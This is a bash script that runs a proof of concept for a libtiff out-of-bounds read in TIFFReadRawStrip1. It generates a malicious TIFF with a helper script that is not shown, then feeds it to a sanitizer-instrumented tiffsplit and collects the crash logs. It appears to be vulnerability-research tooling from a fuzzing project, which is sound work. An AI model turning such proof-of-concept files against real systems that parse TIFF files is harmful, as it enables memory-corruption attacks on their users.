#!/bin/bash
# VULN 001 PoC Runner
# TIFFReadRawStrip1 mmap bounds-check uint32 overflow -> OOB read
set -uo pipefail

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/libtiff/libtiff_tif_read_c"
TIFFSPLIT="/data/ylwang/non-textfuzz/target/libtiff/build_test/bin/tiffsplit"
TIF="$POC_DIR/vuln_001.tif"
RESULT="$POC_DIR/vuln_001_result.txt"

cd "$POC_DIR"

# Generate the malicious TIFF if not present
if [ ! -f "$TIF" ]; then
    echo "[*] Generating vuln_001.tif ..."
    python3 "$POC_DIR/vuln_001_gen.py" "$TIF"
fi
echo "[*] TIFF file: $TIF ($(wc -c < "$TIF") bytes)"

# Clean previous results
rm -f "$RESULT" ./asan.log.*

echo "[*] Running tiffsplit ..."
ASAN_OPTIONS="abort_on_error=0:log_path=$POC_DIR/asan.log" \
  "$TIFFSPLIT" "$TIF" /tmp/tiffsplit_out_ > "$RESULT" 2>&1 || true

# Collect any ASAN/UBSAN output
for f in "$POC_DIR"/asan.log.*; do
    if [ -f "$f" ]; then
        echo "" >> "$RESULT"
        echo "=== ASAN LOG: $f ===" >> "$RESULT"
        cat "$f" >> "$RESULT"
    fi
done

echo "[*] Result written to: $RESULT"
echo ""
echo "=== vuln_001_result.txt ==="
cat "$RESULT"
